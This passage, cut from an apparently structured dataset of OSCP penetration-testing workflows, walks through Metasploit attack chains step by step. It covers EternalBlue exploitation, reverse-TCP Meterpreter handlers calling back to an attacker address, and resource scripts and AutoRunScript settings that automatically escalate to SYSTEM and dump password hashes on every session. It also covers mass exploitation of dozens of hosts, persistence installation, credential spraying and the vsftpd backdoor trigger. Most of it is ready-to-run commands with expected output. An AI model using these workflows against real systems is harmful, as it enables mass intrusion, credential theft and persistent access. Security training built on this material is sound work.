Step 7: Monitor progress: jobs (shows running exploits), sessions -l (shows opened sessions). Step 8: Review results: loot (shows hashdump outputs saved to database)."", ""commands"": [""msf-use-module"", ""msf-set-payload"", ""msf-set-lhost"", ""msf-set-lport"", ""msf-exploit-run"", ""msf-sessions-list"", ""msf-jobs-list""], ""expected_outcome"": ""Resource script execution: msfconsole loads, reads script line-by-line, executes commands sequentially. Console output: '[*] Processing /root/eternalblue_multi.rc, [*] resource (/root/eternalblue_multi.rc)> use exploit/windows/smb/ms17_010_eternalblue, [*] resource> set RHOSTS 192.168.45.100, [*] resource> exploit -j -z, [*] Exploit running as background job 0, [*] Started reverse TCP handler on 192.168.45.5:4444, [*] Meterpreter session 1 opened'. After sleep, commands execute on sessions: 'getsystem' output, 'hashdump' output stored in loot. Time: 5-10 minutes to write script, 2-5 minutes to execute (faster than manual). Success indicators: jobs shows 5 background jobs (one per target), sessions -l shows 5 Meterpreter sessions, loot shows 5 credential dumps. Common issues: Script syntax errors (missing commas, wrong command format - test commands manually first), Exploit timing issues (sessions not opened before post-exploit commands - increase sleep duration), LHOST/LPORT conflicts (ensure handler ports unique if multiple handlers)."", ""why_this_works"": ""Resource scripts (.rc files): Plain text files with Metasploit console commands (one command per line), Executed sequentially by msfconsole via -r flag, Equivalent to typing commands manually (no special syntax), Supports all msfconsole commands (use, set, exploit, sessions, run, etc.). Script structure: Configuration section: use <module>, set <option> <value> (configure module once), Execution section: set RHOSTS <target>; exploit -j -z (repeat per target), Post-exploitation section: sleep <seconds> (wait for sessions), sessions -i <id> -c '<commands>' (run commands on session). Background exploitation (-j -z): exploit -j runs as background job (non-blocking), -z doesn't auto-interact (stays backgrounded), Allows script to continue to next target without waiting, Multiple exploits run in parallel (faster than sequential). Session command execution: sessions -c '<cmd>' -i <id> runs command on specific session without interaction, Example: sessions -i 1 -c 'getsystem' (escalate privileges on session 1), Supports multiple commands: sessions -i 1 -c 'getsystem; hashdump; run autoroute -s 10.10.10.0/24', Output stored in database (loot table) and console. Sleep for timing: Exploits need time to complete before post-exploitation, sleep 10 waits 10 seconds for sessions to open, Adjust based on network latency and target count (larger sleep for more targets). Resource script best practices: Add comments: Lines starting with # are comments, Example: '# Target 1: Windows 7 x64 - MS17-010', Set global options once: set payload, set LHOST, set LPORT (applies to all exploit runs), Use ExitOnSession false: Handler continues after first session (critical for multi-target). Creating resource scripts: Manual capture: During manual testing, copy successful commands to .rc file, Automated capture: makerc <file> (saves command history to resource script), Example: After successful manual exploitation: makerc /root/success.rc (saves recent commands). Executing resource scripts: From command line: msfconsole -r /root/script.rc (loads msfconsole with script), From msfconsole: resource /root/script.rc (execute while in msfconsole), Chaining scripts: msfconsole -r setup.rc -r exploit.rc -r post.rc (multiple scripts). OSCP use cases: Lab reset automation: Re-exploit known vulnerable boxes after reset (save 30-60 minutes), Exam preparation: Practice exploitation chains until muscle memory (speed improvement), Documentation: Resource scripts serve as reproducible proof of methodology, Testing: Verify exploit reliability across multiple targets (quality assurance). Example resource script (MS17-010 automation): '# MS17-010 Multi-Target Exploitation, use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false, # Target 1, set RHOSTS 192.168.45.100, exploit -j -z, # Target 2, set RHOSTS 192.168.45.101, exploit -j -z, # Wait for sessions, sleep 15, # Post-exploitation, sessions -i 1 -c \""getsystem; hashdump; background\"", sessions -i 2 -c \""getsystem; hashdump; background\""'. Troubleshooting: Script stops at error: Add error handling: set PROMPT false (don't wait for user input), Use && for conditional execution: set RHOSTS 192.168.45.100 && exploit, Commands not executing: Check syntax (no typos, correct module paths), Verify options required: show options (before exploit), Sessions not receiving commands: Increase sleep (sessions may not be ready), Check session IDs: sessions -l (verify IDs before -i flag). Advanced techniques: Looping in resource scripts: Use Ruby scripting in .rc (framework.sessions.each ...), Database queries: hosts -c address | grep 192.168.45 (get target list from database), Conditional execution: if session exists, run post-exploitation; else skip.""}, {""title"": ""Scenario 2: AutoRunScript for Automatic Post-Exploitation"", ""context"": ""Penetration test requires credential dumping on every compromised Windows host. Manual hashdump on 20 targets is time-consuming and error-prone. Goal: Configure handler to automatically dump credentials on every new session."", ""approach"": ""Step 1: Create post-exploitation script: nano /root/auto_post.rc (resource script with post commands). Step 2: Add post-exploitation commands: 'getsystem, run post/windows/manage/migrate, hashdump, run post/windows/gather/enum_logged_on_users, background'. Step 3: Set up handler with AutoRunScript: use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 4444; set AutoRunScript multi_console_command -rc /root/auto_post.rc; set ExitOnSession false; exploit -j. Step 4: Deliver payloads to targets (web upload, phishing, manual exploit). Step 5: As sessions open, AutoRunScript executes automatically. Step 6: Review results: loot (shows credentials from all sessions), creds (database credentials table). Step 7: Alternative - single-command AutoRunScript: set AutoRunScript 'multi_console_command -c \""getsystem; hashdump\""' (inline commands without .rc file)."", ""commands"": [""msf-handler-autorunscript"", ""msf-handler-setup"", ""msf-handler-exitonsession""], ""expected_outcome"": ""Handler starts: '[*] Started reverse TCP handler on 192.168.45.5:4444, [*] AutoRunScript: multi_console_command -rc /root/auto_post.rc'. When payload connects: '[*] Sending stage (200774 bytes), [*] Meterpreter session 1 opened, [*] Session ID 1 processing AutoRunScript, [*] Running resource script: /root/auto_post.rc, [+] getsystem success: NT AUTHORITY\\SYSTEM, [*] Migrating to explorer.exe (PID 1824), [+] Migration successful, [+] Hashdump complete: Administrator:500:hash:hash:::, [*] Session backgrounded'. Process repeats for each new session (sessions 2, 3, 4...). loot shows: '192.168.45.100 - windows.hashes.mscache (Administrator, Guest, bob)', '192.168.45.101 - windows.hashes.mscache (...)'. Time: 1-2 minutes to configure AutoRunScript, 0 seconds manual intervention per session (fully automated). Advantages: No manual interaction needed per session, Consistent post-exploitation (no missed steps), Fast (credentials dumped within seconds of session opening), Scalable (works with 1 or 100 sessions). Common issues: AutoRunScript fails and session dies (script too aggressive - test manually first), Migration kills session (choose stable process in script), Script timeout (Metasploit kills script after 60s default - keep scripts under 60s)."", ""why_this_works"": ""AutoRunScript mechanics: Handler option that executes script on every new session, Triggers after Meterpreter stage loads (before user interaction), Runs in session context (commands execute on target as if typed manually), Supports: Resource scripts (-rc <file>), Inline commands (-c '<commands>'), Post-exploitation modules (run post/...). multi_console_command module: Metasploit module for running console/Meterpreter commands, Usage: multi_console_command -rc <script.rc> (execute resource script), multi_console_command -c '<command>' (execute inline command), Runs in Meterpreter context if session is Meterpreter, Runs in console context if command shell. AutoRunScript use cases: Credential dumping: hashdump, load kiwi; creds_all (automatic on every session), Process migration: run post/windows/manage/migrate (stabilize session immediately), Enumeration: run post/windows/gather/enum_system (collect system info), Persistence: run persistence -X -i 60 -p 443 -r <LHOST> (auto-install persistence). AutoRunScript vs manual post-exploitation: Manual: Open session \u2192 getsystem \u2192 hashdump \u2192 background (1-2 minutes per session \u00d7 20 sessions = 20-40 minutes), AutoRunScript: Configure once \u2192 automatic on all sessions (0 minutes per session, 20-40 minutes saved). Configuration examples: Credential dumping: set AutoRunScript 'multi_console_command -c \""getsystem; hashdump\""', Process migration + hashdump: set AutoRunScript 'multi_console_command -c \""run post/windows/manage/migrate; getsystem; hashdump\""', Full enumeration: set AutoRunScript multi_console_command -rc /root/full_enum.rc (resource script with 10+ commands). Resource script for AutoRunScript (/root/auto_post.rc): '# Automatic Post-Exploitation, # Escalate privileges, getsystem, # Migrate to stable process, run post/windows/manage/migrate, # Dump credentials, hashdump, # Enumerate logged-on users, run post/windows/gather/enum_logged_on_users, # Background session for next payload, background'. Troubleshooting: AutoRunScript kills session: Script too aggressive (migration fails, getsystem crashes service), Solution: Test script manually first (verify all commands succeed), Remove risky commands (migration may fail on some systems). Script timeout (Metasploit default 60 seconds): Long scripts exceed timeout (Metasploit kills AutoRunScript after 60s), Solution: Keep scripts under 60s (remove non-critical commands), Increase timeout: set AutoRunScriptTimeout 120 (in seconds). AutoRunScript not executing: Verify option set before exploit: show options | grep AutoRunScript, Check script path correct: ls -l /root/auto_post.rc (file exists?), Check script syntax: resource /root/auto_post.rc (test manually). Session backgrounding in AutoRunScript: Always end script with 'background' (prevents blocking next session), Without background: AutoRunScript waits for user interaction (defeats automation), Ctrl+Z doesn't work in AutoRunScript context (script must background itself). OSCP exam strategy: Set up AutoRunScript handler at start of exam, Use for all Windows targets (automatic credential dumping), Saves 5-10 minutes per target (significant time savings), Reduces errors (no missed hashdumps), Provides backup (credentials saved to database even if session lost later). Advanced AutoRunScript techniques: Conditional execution: if getuid != SYSTEM, run getsystem, Multi-OS support: Detect OS (sysinfo), run Windows or Linux post-exploitation accordingly, Pivoting automation: Detect additional networks (ipconfig), add autoroute automatically, Error handling: Ignore failures (getsystem may fail, continue to hashdump anyway). Alternative automation approaches: Session scripting: sessions -c '<commands>' (run commands on existing sessions, not automatic), Post-exploitation modules: use post/multi/manage/shell_to_meterpreter; set SESSION 1; run (upgrade specific session), Makerc: makerc <file> (save command history for replay, not automatic). Comparison: AutoRunScript vs Resource Scripts: AutoRunScript: Automatic (triggers on session open), Per-session (runs on every new session), Handler configuration (set once, applies to all sessions), Resource Scripts: Manual (user executes), One-time or looped (executes commands in sequence), Console-level (not tied to specific session).""}, {""title"": ""Scenario 3: Mass Exploitation with Database Queries and Looping"", ""context"": ""Penetration test of enterprise network with 50 Windows hosts. Vulnerability scan shows 30 hosts vulnerable to MS17-010. Goal: Exploit all vulnerable hosts in parallel, manage sessions efficiently, extract credentials from all compromised systems."", ""approach"": ""Step 1: Import vulnerability scan results: db_import /root/vuln_scan.xml (nmap or Nessus XML). Step 2: Filter vulnerable hosts: services -p 445 -c address,info > /tmp/smb_hosts.txt (extract SMB hosts). Step 3: Create resource script for mass exploitation: nano /root/mass_eternalblue.rc. Step 4: Add handler and exploitation loop: 'use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false, set AutoRunScript multi_console_command -c \""getsystem; hashdump; background\""'. Step 5: Add target list from database: hosts -R (auto-populate RHOSTS from workspace hosts), OR manually: 'set RHOSTS file:/tmp/smb_hosts.txt' (read from file). Step 6: Execute mass exploitation: exploit -j -z. Step 7: Monitor progress: jobs -l (active exploits), sessions -l (opened sessions), watch -n 5 'msfconsole -x \""sessions -l; exit\""' (auto-refresh session list). Step 8: Collect results: loot (credentials), db_export -f xml /root/results.xml (export all findings)."", ""commands"": [""msf-db-import"", ""msf-services-filter-port"", ""msf-hosts-list"", ""msf-use-module"", ""msf-set-option"", ""msf-exploit-run"", ""msf-sessions-list"", ""msf-jobs-list"", ""msf-db-export""], ""expected_outcome"": ""Database import: '[*] Importing nmap XML file, [*] Import complete: 50 hosts, 150 services'. services filter: 30 SMB hosts extracted. Resource script execution: exploit -j -z starts 30 background jobs (one per host). jobs -l shows: 'Id 0: Exploit: windows/smb/ms17_010_eternalblue RHOSTS: 192.168.45.100, Id 1: ... RHOSTS: 192.168.45.101, ...' (30 total). Sessions open over 5-10 minutes: '[*] Meterpreter session 1 opened (192.168.45.100), AutoRunScript executes: getsystem \u2192 hashdump \u2192 background, [*] Meterpreter session 2 opened (192.168.45.101), ...' (up to 30 sessions). Time: 10-15 minutes for 30 hosts (vs 60-90 minutes manually). Success rate: 70-90% of vulnerable hosts exploited (some may have firewalls or recent patches). loot shows credentials from all successful exploitations. Efficiency gain: 30 hosts exploited in time of 5-10 (parallel execution). Manual approach: Exploit one host \u2192 wait for session \u2192 post-exploit \u2192 move to next (sequential, slow). Automated approach: Launch all exploits in parallel \u2192 sessions open asynchronously \u2192 AutoRunScript handles post-exploit (parallel, fast)."", ""why_this_works"": ""Mass exploitation strategy: Parallel vs sequential execution: Sequential: Exploit host 1 \u2192 session opens \u2192 post-exploit \u2192 exploit host 2 \u2192 ... (1-2 min per host \u00d7 30 = 30-60 min), Parallel: Exploit all 30 hosts simultaneously \u2192 sessions open asynchronously \u2192 AutoRunScript handles post-exploit (5-10 min total). Database-driven targeting: db_import loads scan results into Metasploit database, services -p 445 filters to SMB hosts only (relevant targets), hosts -R auto-populates RHOSTS from workspace (no manual IP entry), Supports complex queries: services -p 445 -s 'Windows 7' -R (filter by OS version). Background job management: exploit -j -z launches exploit as background job (non-blocking), Metasploit manages job queue (tracks all running exploits), jobs -l shows active jobs, jobs -k <id> kills specific job, jobs -K kills all jobs. Session management at scale: ExitOnSession false: Handler continues after first session (critical for multi-target), AutoRunScript: Automatic post-exploitation on every session (eliminates manual work), sessions -l: List all sessions with status (alive/dead), sessions -K: Kill all sessions (cleanup). Resource script for mass exploitation (/root/mass_eternalblue.rc): '# Mass MS17-010 Exploitation, # Configure exploit, use exploit/windows/smb/ms17_010_eternalblue, set payload windows/x64/meterpreter/reverse_tcp, set LHOST 192.168.45.5, set LPORT 4444, set ExitOnSession false, set AutoRunScript multi_console_command -c \""getsystem; hashdump; background\"", # Auto-populate targets from database, hosts -R, # Execute in background, exploit -j -z'. Alternative target population methods: File-based: set RHOSTS file:/tmp/targets.txt (one IP per line), CIDR range: set RHOSTS 192.168.45.0/24 (Metasploit auto-expands), Comma-separated: set RHOSTS 192.168.45.100,192.168.45.101,192.168.45.102. Monitoring mass exploitation: Real-time monitoring: watch -n 5 'msfconsole -x \""sessions -l; jobs -l; exit\""' (auto-refresh every 5 seconds), Job completion: jobs -l | wc -l (count active jobs, decreases as exploits complete), Session count: sessions -l | grep meterpreter | wc -l (count successful exploits). Credential extraction at scale: AutoRunScript hashdump: Credentials stored in loot table automatically, loot -t windows.hashes (filter to password hashes only), creds: View all credentials across all sessions (username:hash pairs), db_export: Export all credentials to XML/JSON for reporting. Threading and performance: Metasploit default: 1 thread per exploit job (30 jobs = 30 threads), Performance tuning: set THREADS 5 (increase threads per job for faster exploitation), Risk: Too many threads can overwhelm target network (dropped packets, failed exploits), Recommended: THREADS 1-5 for stable exploitation, adjust based on network capacity. Success rate optimization: Verify vulnerability first: use auxiliary/scanner/smb/smb_ms17_010; hosts -R; run (confirm vulnerable before exploit), Filter false positives: Only exploit hosts confirmed vulnerable (increase success rate), Retry failures: After mass exploitation, re-run exploit on failed hosts (some may succeed on retry). Troubleshooting mass exploitation: Exploits hang or fail: Network congestion (reduce parallel jobs: exploit in batches of 10), Firewall blocking (some hosts may be protected, normal in large-scale), Resource exhaustion: Too many sessions (migrate sessions to stable processes, kill dead sessions: sessions -K -z). Sessions die quickly: Unstable payloads (use non-staged for stability: set payload windows/x64/meterpreter_reverse_tcp), AutoRunScript killing sessions (remove risky commands like migration). Handler not catching all sessions: Port exhaustion (handler on single port may miss some connections), Solution: Use port ranges: set LPORT 4444-4454 (handler listens on multiple ports). OSCP exam considerations: Mass exploitation less common in exam (3-5 targets, not 30), Use techniques for lab practice (exploit all lab machines efficiently), Time savings: AutoRunScript + resource scripts save 30-60 minutes in lab rotations, Exam strategy: Prepare resource scripts for common exploits (MS17-010, EternalBlue, Shellshock), execute quickly if encountered. Advanced automation: Dynamic target selection: hosts -S 'Windows 7' -R (filter by OS, auto-populate), Post-exploitation routing: AutoRunScript adds routes: 'run autoroute -s 10.10.10.0/24', Credential spraying post-compromise: After hashdump, automatically test credentials across all hosts: 'use auxiliary/scanner/smb/smb_login; set SMBUser administrator; set SMBPass <hash>; hosts -R; run'.""}]","[{""title"": ""Phase 1: Resource Script Creation (Capture Successful Workflow)"", ""notes"": ""After successful manual exploitation, capture workflow for automation. Use makerc <file> to save command history. Alternatively, manually create .rc file with commands. Include: Module selection (use, set), Target configuration (set RHOSTS), Execution (exploit -j -z), Post-exploitation (sessions -c commands). Test resource script: msfconsole -r <file>. Estimated time: 5-10 minutes to create and test."", ""commands"": [{""id"": ""msf-use-module"", ""example"": ""use exploit/multi/handler"", ""shows"": ""Prompt changes to show module type and path""}, {""id"": ""msf-set-option"", ""example"": ""set RHOSTS 192.168.45.100"", ""shows"": ""OPTION => VALUE confirmation message""}, {""id"": ""msf-exploit-run"", ""example"": ""exploit"", ""shows"": ""Started reverse TCP handler""}]}, {""title"": ""Phase 2: AutoRunScript Configuration (Automatic Post-Exploitation)"", ""notes"": ""Configure handler with AutoRunScript for automatic post-exploitation on every session. Create post-exploitation .rc file or use inline commands. Set AutoRunScript: set AutoRunScript 'multi_console_command -rc <file>' or set AutoRunScript 'multi_console_command -c \""<commands>\""'. Include: getsystem (privilege escalation), hashdump (credential dumping), migration (stability), background (allow next session). Set ExitOnSession false (multi-session support). Estimated time: 2-3 minutes to configure."", ""commands"": [{""id"": ""msf-handler-autorunscript"", ""example"": ""use exploit/multi/handler; set payload windows/meterpreter_reverse_https; set LHOST 192.168.45.5; set LPORT 443; set AutoRunScript post/windows/manage/migrate; run -j"", ""shows"": ""AutoRunScript set""}, {""id"": ""msf-handler-setup"", ""example"": ""use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; run"", ""shows"": ""Started reverse TCP handler on <LHOST>:<LPORT>""}, {""id"": ""msf-handler-exitonsession"", ""example"": ""use exploit/multi/handler; set payload windows/meterpreter_reverse_tcp; set LHOST 192.168.45.5; set LPORT 443; set ExitOnSession false; run -j"", ""shows"": ""ExitOnSession => false""}]}, {""title"": ""Phase 3: Database-Driven Targeting (Mass Exploitation Setup)"", ""notes"": ""Import scan results: db_import <nmap.xml>. Filter targets: services -p <PORT> -R (auto-populate RHOSTS). Alternative: Export to file: services -p 445 -c address > targets.txt; set RHOSTS file:targets.txt. Verify target count: show options | grep RHOSTS. Configure handler with ExitOnSession false and AutoRunScript. Estimated time: 2-5 minutes for import and filtering."", ""commands"": [{""id"": ""msf-db-import"", ""example"": ""db_import /home/kali/scans/network.xml"", ""shows"": ""Importing data...""}, {""id"": ""msf-services-filter-port"", ""shows"": ""See command documentation""}, {""id"": ""msf-hosts-list"", ""shows"": ""See command documentation""}, {""id"": ""msf-set-option"", ""example"": ""set RHOSTS 192.168.45.100"", ""shows"": ""OPTION => VALUE confirmation message""}]}, {""title"": ""Phase 4: Parallel Execution and Monitoring"", ""notes"": ""Execute mass exploitation: exploit -j -z (background jobs for all targets). Monitor progress: jobs -l (active exploits), sessions -l (opened sessions), watch -n 5 'msfconsole -x \""sessions -l; exit\""' (auto-refresh). Wait for sessions to open (5-15 minutes depending on target count). AutoRunScript handles post-exploitation automatically. Estimated time: 5-15 minutes for exploitation to complete."", ""commands"": [{""id"": ""msf-exploit-run"", ""example"": ""exploit"", ""shows"": ""Started reverse TCP handler""}, {""id"": ""msf-jobs-list"", ""example"": ""jobs"", ""shows"": ""Jobs table with ID, Name, Payload, Payload opts""}, {""id"": ""msf-sessions-list"", ""example"": ""sessions -l"", ""shows"": ""Active sessions table with ID, Name, Type, Information, C...""}]}, {""title"": ""Phase 5: Results Collection and Documentation"", ""notes"": ""Review credentials: loot (all credential dumps), creds (database credentials table). Export findings: db_export -f xml /root/results.xml (includes hosts, services, credentials, sessions). Document resource scripts for reporting (reproducible methodology). Cleanup: sessions -K (kill all sessions), jobs -K (kill all jobs). Save successful resource scripts for future use. Estimated time: 5-10 minutes for collection and export."", ""commands"": [{""id"": ""msf-sessions-list"", ""example"": ""sessions -l"", ""shows"": ""Active sessions table with ID, Name, Type, Information, C...""}, {""id"": ""msf-db-export"", ""shows"": ""See command documentation""}, {""id"": ""msf-jobs-list"", ""example"": ""jobs"", ""shows"": ""Jobs table with ID, Name, Payload, Payload opts""}]}]"
"metasploit-exploitation","Metasploit Exploitation - Payload Delivery & Session Management","End-to-end exploitation workflow using Metasploit exploit modules, payload selection, handler setup, and session management for gaining and maintaining access on OSCP targets","METASPLOIT|EXPLOITATION|PAYLOAD|HANDLER|SESSION|METERPRETER|OSCP:HIGH|SHELLS","{""how_to_recognize"": [""Service version matches known CVE with Metasploit exploit module available"", ""Auxiliary scan confirmed vulnerability (MS17-010, Shellshock, etc.)"", ""Need to deliver payload to compromised service for shell access"", ""Requirement to catch multiple reverse shells from different targets"", ""Existing shell needs upgrade to Meterpreter for advanced features"", ""Multiple active sessions requiring organized management""], ""when_to_look_for"": [""After enumeration confirms exploitable service version (e.g., SMB 1.0, vsftpd 2.3.4)"", ""When searchsploit shows Metasploit module for discovered vulnerability"", ""Before manual exploitation attempts (try Metasploit first for speed)"", ""When you need reliable payload delivery and session management"", ""For multi-target exploitation (background handlers, multiple sessions)"", ""When post-exploitation framework is needed (Meterpreter > basic shell)""]}","[{""title"": ""Scenario 1: Basic Exploitation Workflow - SMB MS17-010 (EternalBlue)"", ""context"": ""Target: Windows Server 2008 R2 (192.168.45.100), SMB port 445 open. Auxiliary scan confirmed vulnerable to MS17-010. Goal: Exploit EternalBlue to gain SYSTEM shell."", ""approach"": ""Step 1: Confirm vulnerability: use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.45.100; run (should show 'Host is VULNERABLE'). Step 2: Select exploit module: use exploit/windows/smb/ms17_010_eternalblue. Step 3: View required options: show options (note RHOSTS required). Step 4: View compatible payloads: show payloads (list shows 40+ Windows payloads). Step 5: Select payload: set payload windows/x64/meterpreter/reverse_tcp. Step 6: Configure payload: set LHOST 192.168.45.5; set LPORT 4444. Step 7: Set target: set RHOSTS 192.168.45.100. Step 8: Check configuration: show options (verify all required fields set). Step 9: Optionally check target: check (verifies vulnerability without exploiting). Step 10: Exploit: exploit (or run)."", ""commands"": [""msf-aux-smb-ms17010"", ""msf-use-module"", ""msf-show-options"", ""msf-show-payloads"", ""msf-set-payload"", ""msf-set-lhost"", ""msf-set-lport"", ""msf-exploit-check"", ""msf-exploit-run""], ""expected_outcome"": ""check command shows: '[+] 192.168.45.100:445 - The target is vulnerable'. exploit shows: '[*] Started reverse TCP handler on 192.168.45.5:4444, [*] Sending stage (200774 bytes), [*] Meterpreter session 1 opened'. Prompt changes to 'meterpreter >' with SYSTEM privileges. Time: 30-90 seconds from module selection to shell. Failure indicators: 'Exploit completed, but no session was created' (payload mismatch or firewall), 'Exploit failed: Rex::ConnectionTimeout' (target offline or firewall blocking). Next steps: getuid (verify SYSTEM), sysinfo (OS details), hashdump (extract credentials). Common issues: Wrong architecture (x86 vs x64), Firewall blocking reverse connection, Service already patched."", ""why_this_works"": ""MS17-010 (CVE-2017-0144) exploits: SMBv1 buffer overflow in srv.sys driver, Allows remote code execution without authentication, Targets Windows Vista to Server 2008 R2 (pre-patch). Exploit steps: 1) Send specially crafted SMB packets to trigger buffer overflow, 2) Overwrite kernel memory to gain SYSTEM privileges, 3) Execute staged payload (Meterpreter) in privileged context, 4) Meterpreter payload connects back to handler. Payload staging: 'windows/x64/meterpreter/reverse_tcp' is staged (small initial shellcode), '/' separates stager (reverse_tcp) from stage (meterpreter/x64), Staged payloads smaller (bypass size restrictions) but require handler. Handler setup: exploit command starts multi/handler automatically, Handler listens on LHOST:LPORT for stage 2 connection, Sends full Meterpreter DLL after stage 1 connects. Why Meterpreter: Runs in memory (no disk artifacts), Provides advanced post-exploitation (hashdump, screenshot, keylog), Enables pivoting (route, portfwd). OSCP notes: EternalBlue highly reliable (rank: excellent), Works on unpatched Windows 7/Server 2008 R2 (common in labs), Firewall often blocks 4444 (use ports 80, 443, 53 for egress). Troubleshooting: If exploit hangs, try different target: show targets; set target 1. If no session, try non-staged payload: set payload windows/x64/meterpreter_reverse_tcp.""}, {""title"": ""Scenario 2: Multi-Target Exploitation with Background Handlers"", ""context"": ""3 Windows targets (192.168.45.100-102) vulnerable to different exploits. Need to exploit all while maintaining organized session management. Goal: Run multiple handlers in background, catch all shells, switch between sessions."", ""approach"": ""Step 1: Set up first handler in background: use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 192.168.45.5; set LPORT 4444; set ExitOnSession false; exploit -j -z (runs as background job). Step 2: Set up second handler on different port: set LPORT 4445; exploit -j -z. Step 3: Verify handlers running: jobs (shows background jobs). Step 4: Exploit first target (manually or via separate exploit module): delivers payload to port 4444. Step 5: Exploit second target with different payload: delivers to port 4445. Step 6: Check sessions: sessions -l (shows all active sessions). Step 7: Interact with specific session: sessions -i 1. Step 8: Background current session: background (or Ctrl+Z). Step 9: Switch to different session: sessions -i 2."", ""commands"": [""msf-handler-background"", ""msf-handler-exitonsession"", ""msf-jobs-list"", ""msf-sessions-list"", ""msf-session-interact"", ""msf-session-background""], ""expected_outcome"": ""exploit -j -z shows: '[*] Exploit running as background job 0', '[*] Started reverse TCP handler on 192.168.45.5:4444'. jobs command lists: 'Id 0: Exploit: multi/handler Payload: windows/meterpreter/reverse_tcp'. When payloads connect: '[*] Sending stage (200774 bytes), [*] Meterpreter session 1 opened'. sessions -l shows: 'Id 1: 192.168.45.100:49234 -> 192.168.45.5:4444 (NT AUTHORITY\\SYSTEM) meterpreter x64/windows'. Time: 1-2 minutes to set up handlers, instant session switching. ExitOnSession false critical: allows single handler to catch multiple connections. Without it: Handler stops after first session, subsequent exploits fail. Background jobs enable: Continue working while handlers listen, Run multiple handlers simultaneously, Organize multi-target operations."", ""why_this_works"": ""Background handlers using multi/handler: Universal listener for all payload types (staged/non-staged), Can receive connections from any exploit (not tied to specific CVE), Runs as background job (doesn't block msfconsole prompt). Flag explanations: exploit -j (run as job, returns job ID), exploit -z (don't auto-interact with session, stays backgrounded), ExitOnSession false (handler continues after first session, critical for multi-target). Session management architecture: Each session = independent command channel to compromised host, Sessions persist until explicitly killed or target reboots, Can run commands on specific session without interacting: sessions -c 'sysinfo' -i 1. Workflow for multiple targets: 1) Set up background handlers on different ports (4444, 4445, 4446), 2) Generate payloads for each port: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444, 3) Deliver payloads via web upload, email, SMB, etc., 4) Handlers catch connections as payloads execute, 5) Manage sessions with sessions command. OSCP exam scenario: 3 Windows boxes + 1 Linux box = 4 background handlers (3x Windows payloads, 1x Linux payload), Separate handler per port prevents confusion, Use descriptive ports: 4444 (web-01), 4445 (dc-01), 4446 (file-server). Advantages: No manual nc listeners (Meterpreter > basic shell), Centralized session management (sessions -l shows all), Database integration (sessions recorded in database). Troubleshooting: Handler not catching connection: Verify payload matches handler (staged vs non-staged), Check LHOST/LPORT in payload matches handler settings. Too many sessions: Use sessions -k <ID> to kill dead sessions, sessions -K to kill all (dangerous).""}, {""title"": ""Scenario 3: Payload Selection and Troubleshooting"", ""context"": ""Exploit module loaded (vsftpd 2.3.4 backdoor), target is Linux. Need to select appropriate payload, but exploit keeps failing. Goal: Understand payload compatibility, try alternatives, achieve successful exploitation."", ""approach"": ""Step 1: Load exploit: use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.45.100. Step 2: View compatible payloads: show payloads (shows cmd/unix/interact only). Step 3: Check default payload: show options (payload already set to cmd/unix/interact). Step 4: Try exploit: exploit (fails with 'no session created'). Step 5: Review exploit info: info (check 'Targets', 'Reliable', 'Disclosure Date'). Step 6: Check if target requires specific version: show targets; set target 0 (automatic). Step 7: Try manual target selection: set target 1. Step 8: If still failing, verify vulnerability: use auxiliary/scanner/ftp/ftp_version; set RHOSTS 192.168.45.100; run (confirms version 2.3.4). Step 9: Try alternative exploit or manual exploitation. Step 10: If exploit succeeds, verify shell: background; sessions -l (shows cmd/unix session, not Meterpreter)."", ""commands"": [""msf-use-module"", ""msf-show-payloads"", ""msf-show-options"", ""msf-exploit-run"", ""msf-info-module"", ""msf-show-targets"", ""msf-set-target""], ""expected_outcome"": ""show payloads for vsftpd backdoor shows only 'cmd/unix/interact' (command shell, not Meterpreter - this exploit doesn't support Meterpreter). exploit success shows: '[*] 192.168.45.100:6200 - Banner: 220 (vsFTPd 2.3.4), [*] Command shell session 1 opened'. Note: session type is 'shell', not 'meterpreter'. sessions -l shows 'cmd/unix' type. Upgrade to Meterpreter: sessions -u 1 (attempts to upgrade shell to Meterpreter). Upgrade may fail on some shells (platform limitations). Time: 10-30 seconds for successful exploit. Common failures: Wrong payload type (trying Meterpreter on cmd-only exploit), Target OS mismatch (Windows payload on Linux target), Exploit reliability issues (some exploits rank 'manual' or 'low'). Troubleshooting steps: Check module rank: info (look for 'Rank: Excellent' vs 'Rank: Low'), Verify payload compatibility: show payloads (only shows compatible payloads), Try manual exploitation if module fails: nc 192.168.45.100 21; USER user:); PASS pass."", ""why_this_works"": ""Payload compatibility determined by: Target operating system (Windows/Linux/macOS/BSD), Target architecture (x86, x64, ARM, MIPS), Exploit module constraints (some exploits only support specific payload types), Shell type (command shell vs Meterpreter vs VNC). cmd/unix/interact payload: Spawns /bin/sh shell on Linux/Unix targets, No staging (single-stage payload), Minimal functionality (no Meterpreter features), Used by exploits with tight space constraints. Payload naming convention: <platform>/<arch>/<type>/<handler>, Example: windows/x64/meterpreter/reverse_tcp, platform=windows, arch=x64, type=meterpreter, handler=reverse_tcp. Staged vs non-staged: Staged (/) = multi-stage (small initial payload + full stage), Non-staged (_) = single payload (larger, self-contained), Example: windows/meterpreter/reverse_tcp (staged) vs windows/meterpreter_reverse_tcp (non-staged). When to use non-staged: Target environment blocks staged delivery, Time constraints (non-staged connects faster), Firewall rules (some firewalls detect multi-stage as malicious). Module reliability ranks: Excellent = always works, never crashes service, Great = usually works, rarely crashes, Good = sometimes crashes service, Normal = often unstable, Average/Low/Manual = unreliable, requires tweaking. OSCP strategy: Prefer rank:excellent|great modules, Try multiple payloads if first fails (staged \u2192 non-staged \u2192 cmd shell), Use sessions -u to upgrade cmd shell to Meterpreter post-exploit, Fallback to manual exploitation if Metasploit module unreliable. vsftpd 2.3.4 backdoor explanation: Malicious version released in 2011 (intentional backdoor), Triggers on username ending with ':)' (smiley face), Opens root shell on port 6200, Exploit success rate: 100% if correct version, Common in CTFs and OSCP-style labs.""}, {""title"": ""Scenario 4: Session 